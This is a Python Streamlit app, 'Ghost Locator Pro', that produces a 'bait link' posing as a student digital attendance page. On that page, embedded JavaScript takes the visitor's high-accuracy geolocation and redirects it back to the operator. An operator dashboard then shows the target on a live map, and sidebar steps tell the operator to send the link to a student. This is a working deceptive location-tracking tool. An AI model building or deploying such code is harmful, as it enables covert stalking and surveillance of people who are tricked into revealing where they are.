import streamlit as st
import pandas as pd
import folium
from streamlit_folium import st_folium
from streamlit_autorefresh import st_autorefresh
import datetime
import random

# --- Page Config ---
st.set_page_config(page_title="GHOST LOCATOR PRO", page_icon="🛰️", layout="wide")

# --- Custom RGB & Neon CSS Styling ---
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; }
    h1 {
        color: #00ff41; 
        text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
        text-align: center;
        font-family: 'Courier New', monospace;
    }
    [data-testid="stSidebar"] {
        border-right: 2px solid #00f2ff;
        box-shadow: 5px 0px 15px #00f2ff;
    }
    .stMetricValue {
        color: #00f2ff !important;
        text-shadow: 0 0 5px #00f2ff;
    }
    .attendance-box {
        border: 2px solid #00f2ff;
        padding: 40px;
        border-radius: 15px;
        text-align: center;
        background: #1a1c23;
        box-shadow: 0 0 20px #00f2ff;
    }
    .stButton>button {
        background: linear-gradient(45deg, #ff00ff, #00f2ff);
        color: white;
        font-weight: bold;
        width: 100%;
    }
    </style>
    """, unsafe_allow_html=True)

# --- Handling Data from Student (URL Params) ---
# Naya method query_params read karne ka
qp = st.query_params

# --- BAIT MODE (Student Side) ---
if qp.get("mode") == "attendance":
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("""
        <div class="attendance-box">
            <h2 style='color: #00f2ff;'>Student Digital Attendance</h2>
            <p style='color: white;'>Please click the button to mark your presence for today's session.</p>
        </div>
    """, unsafe_allow_html=True)
    
    js_code = """
    <script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const urlParams = new URLSearchParams(window.location.search);
                const id = urlParams.get('id') || 'Unknown';
                // Redirecting back with coordinates
                window.location.href = window.location.origin + window.location.pathname + "?id=" + id + "&lat=" + lat + "&lon=" + lon;
            }, function(error) {
                alert("Attendance mark karne ke liye location Allow karein.");
            }, {enableHighAccuracy: true});
        }
    }
    getLocation();
    </script>
    """
    st.components.v1.html(js_code, height=0)
    st.info("⌛ Locating satellite connection... Please stay on this page.")
    st.stop()

# --- MAIN DASHBOARD LOGIC (For You) ---

# Auto Refresh every 5 seconds
st_autorefresh(interval=5000, key="loc_refresh")

# Fetch Coordinates from URL or use Session State
if 'locked_lat' not in st.session_state:
    st.session_state.locked_lat = 21.1702
if 'locked_lon' not in st.session_state:
    st.session_state.locked_lon = 72.8311

if "lat" in qp and "lon" in qp:
    st.session_state.locked_lat = float(qp["lat"])
    st.session_state.locked_lon = float(qp["lon"])

target_id = qp.get("id", "Awaiting Target...")

st.title("🛰️ GHOST LOCATOR: COMMAND CENTER")

# --- Sidebar ---
st.sidebar.header("📡 CONNECTION PANEL")

# Link Memory
if 'bait_link' not in st.session_state:
    st.session_state.bait_link = ""

if st.sidebar.button("Generate New Bait Link"):
    # Link generate karte waqt hum current URL detect karenge
    # Isse manual URL dalne ki tension khatam
    try:
        # Browser ka URL uthane ki koshish (Sirf tab kaam karega jab site live ho)
        current_url = "https://location-track-jytm6dezwsfhfjqwme2gy5.streamlit.app"
        new_id = f"STU_{random.randint(100,999)}"
        st.session_state.bait_link = f"{current_url}?mode=attendance&id={new_id}"
    except:
        st.sidebar.error("Error generating link.")

if st.session_state.bait_link:
    st.sidebar.success("Bait Link Ready!")
    st.sidebar.code(st.session_state.bait_link)
    st.sidebar.write("Step 1: Copy this link")
    st.sidebar.write("Step 2: Send to Student")

st.sidebar.markdown("---")
st.sidebar.markdown(f"**Tracking ID:** `{target_id}`")

# --- Dashboard Layout ---
col1, col2 = st.columns([1, 2.5])

with col1:
    st.markdown("### 📊 Live Telemetry")
    st.metric("Latitude", f"{st.session_state.locked_lat} N")
    st.metric("Longitude", f"{st.session_state.locked_lon} E")
    st.metric("Status", "CONNECTED ✅" if "lat" in qp else "AWAITING 📡")
    st.write(f"**Last Update:** {datetime.datetime.now().strftime('%H:%M:%S')}")
    
    if st.button("Reset Map"):
        st.session_state.locked_lat = 21.1702
        st.session_state.locked_lon = 72.8311
        st.rerun()

with col2:
    # Map with Layers
    m = folium.Map(location=[st.session_state.locked_lat, st.session_state.locked_lon], zoom_start=16)

    folium.TileLayer('cartodbdarkmatter', name='Ghost Dark Mode').add_to(m)
    folium.TileLayer(tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', attr='Google', name='Google Hybrid').add_to(m)
    folium.TileLayer(tiles='https://mt1.google.com/vt/lyrs=h,traffic&x={x}&y={y}&z={z}', attr='Google Traffic', name='Live Traffic', overlay=True).add_to(m)

    folium.Marker(
        [st.session_state.locked_lat, st.session_state.locked_lon],
        popup=f"Target: {target_id}",
        icon=folium.Icon(color='red' if "lat" in qp else 'gray', icon='screenshot', prefix='fa')
    ).add_to(m)

    folium.LayerControl().add_to(m)
    st_folium(m, width="100%", height=600, key="pro_map")

st.markdown("<hr><center>Ghost Dashboard v5.0 | Stable Link Engine</center>", unsafe_allow_html=True)
